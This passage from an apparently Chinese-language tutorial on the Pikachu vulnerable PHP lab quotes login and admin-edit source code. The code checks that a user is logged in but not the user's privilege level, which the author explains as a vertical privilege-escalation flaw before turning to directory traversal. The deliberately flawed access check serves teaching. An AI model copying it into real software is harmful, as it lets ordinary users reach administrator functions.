class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/mysql.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/function.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/config.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$username</span><span class="o">=</span><span class="nx">escape</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$password</span><span class="o">=</span><span class="nx">escape</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span><span class="c1">//转义，防注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from users where username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=md5(&#39;</span><span class="si">$password</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$data</span><span class="o">=</span><span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;level&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span><span class="c1">//如果级别是1，进入admin.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">sha1</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;level&#39;</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op2_admin.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;level&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">2</span><span class="p">){</span><span class="c1">//如果级别是2，进入user.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">sha1</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;level&#39;</span><span class="p">]</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op2_user.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//查询不到，登录失败
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;登录失败,请重新登录&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//只要退到这个界面就先清除登录状态，需要重新登录
</span></span></span><span class="line"><span class="cl"><span class="c1">//session_unset();
</span></span></span><span class="line"><span class="cl"><span class="c1">//session_destroy();
</span></span></span><span class="line"><span class="cl"><span class="c1">//setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>然后来看看管理员操作</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;op2_admin_edit.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/mysql.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/function.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/config.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 判断是否登录，没有登录不能访问
</span></span></span><span class="line"><span class="cl"><span class="c1">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_op2_login</span><span class="p">(</span><span class="nv">$link</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op2_login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span><span class="c1">//用户名密码必填
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$getdata</span><span class="o">=</span><span class="nx">escape</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">);</span><span class="c1">//转义
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;insert into member(username,pw,sex,phonenum,email,address) values(&#39;</span><span class="si">{</span><span class="nv">$getdata</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;,md5(&#39;</span><span class="si">{</span><span class="nv">$getdata</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;),&#39;</span><span class="si">{</span><span class="nv">$getdata</span><span class="p">[</span><span class="s1">&#39;sex&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$getdata</span><span class="p">[</span><span class="s1">&#39;phonenum&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$getdata</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$getdata</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_affected_rows</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span><span class="c1">//判断是否插入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op2_admin.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;logout&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;logout&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">session_unset</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">session_destroy</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="nx">session_name</span><span class="p">(),</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nx">time</span><span class="p">()</span><span class="o">-</span><span class="mi">3600</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op2_login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>然后是检查登录函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*op2的check login*/</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_op2_login</span><span class="p">(</span><span class="nv">$link</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from users where username=&#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; and sha1(password)=&#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;op2&#39;</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>函数只是判断了用户是否登录而为判断用户的权限，这就留下了漏洞</p>
<p>因为需要抓到管理员的数据包，可能还需要配合更多漏洞和木马才能完成攻击，所以垂直越权在实际操作上难度相当大，但一旦攻击成功就危害极高，因此万万不能掉以轻心</p>
<h2 id="heading">../../</h2>
<h3 id="概述-9">概述</h3>
<p>在web功能设计中，很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活</p>
<p>当用户发起一个前端的请求时，便会将请求的这个文件的值（比如文件名称）传递到后台，后台再执行其对应的文件。在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过<code>../</code>这样的手段让后台打开或者执行一些其他的文件，从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞
